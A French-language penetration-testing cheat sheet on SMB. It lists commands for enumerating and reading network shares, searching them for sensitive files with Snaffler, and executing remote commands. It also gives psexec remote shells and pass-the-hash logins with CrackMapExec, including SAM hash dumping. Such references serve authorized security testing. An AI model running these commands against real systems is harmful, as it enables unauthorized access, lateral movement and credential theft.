# SMB

### Enumération des partages réseau

* Lister les partages réseau d'une machine de manière anonyme :

```
smbmap -d <DOMAIN.LOCAL> -u '' -p '' -H <IP>
```

```
smbmap -H <IP>
```

* Lister les partages réseau d'une machine avec des identifiants :

```
smbmap -u "username" -p "password" -H <IP>
```

```
smbmap -u "username" -p "<NT>:<LM>" -H <IP>
```

* Lister les partages réseau de machines hors d'un domaine :

```
cme smb <IP>/<MASK> -u <USER> -p <PASS> --shares
```

* Lister les partages réseau de machines présentent au sein d'un domaine :

```
smbclient -L //<IP> -U "<DOMAIN.LOCAL>/<USERS%<PASS>"
```

### Lecture d'un partage

```
smbmap -R <REPERTOIRE> -H <IP> -A <file> -q
```

```
smbclient \\\\<IP>\\<SHARE> -U "<DOMAIN.LOCAL>/<USER>%<PASS>"
```

`ls` : lister le contenu du répertoire.

`cd` : naviguer dans le répertoire.

`get` : télécharger un fichier localement.

**Note :** _il est également possible d'accéder aux partages via l'explorateur de fichier avec le protocole `smb://`._

L'outil `snaffler` peut être utilisé pour automatiser la lecture des partages réseau. De plus, il remonte des informations potentiellement sensibles :&#x20;

```
Snaffler.exe -s -o Snaffler-result.txt
```

### Exécuter des commandes système

Il est possible d'utiliser l'option `-x` de l'outil `smbmap` pour exécuter des commandes système.

### Connexion distante

* Avec des identifiants :

```
psexec.py <DOMAIN.LOCAL>/<USER>:<PASS>@<IP>
cme smb <IP> -u '<USER>' -p '<PASSWORD>' --local-auth
```

* Avec un _hash_ (Pass The Hash):

```
cme smb -u <USER> -H <HASH> --sam <IP>/<MASK>
```

**Note :** _l'utilisateur doit disposer des droits "Administrateur local"._

### Signatures SMB

```
cme smb <IP>
```
